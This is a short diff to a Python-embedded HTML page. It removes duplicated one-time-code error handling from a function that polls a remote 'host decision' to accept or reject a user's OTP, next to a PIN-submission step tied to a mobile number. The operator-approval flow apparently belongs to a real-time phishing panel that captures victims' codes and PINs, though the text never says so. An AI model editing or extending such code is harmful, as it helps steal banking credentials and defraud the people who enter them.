@@ -947,8 +947,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
   }
   goTo('approved');
 }
-
-
     function watchHostDecision(step) {
       if (decisionTimer) clearInterval(decisionTimer);
       decisionTimer = setInterval(async () => {
@@ -976,14 +974,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
               goTo('otp');
               alert('The OTP entered is incorrect. Please re-enter the code.');
             }
-
-              if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY CODE'; }
-              const errorMsg = document.getElementById('otp-error-msg');
-              if (errorMsg) errorMsg.innerText = 'Incorrect code entered. Please re-enter the code.';
-              goTo('otp');
-              alert('The OTP entered is incorrect. Please re-enter the code.');
-            }
-
           } else if (data.status === 'approve') {
             clearInterval(decisionTimer);
             if (otpStepTimer) clearTimeout(otpStepTimer);
@@ -993,6 +983,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
         } catch (e) {}
       }, 3000);
     }
+
 
     function submitPin() {
       const formattedPhone = formatMobileWithCountryCode(appState.mobile);
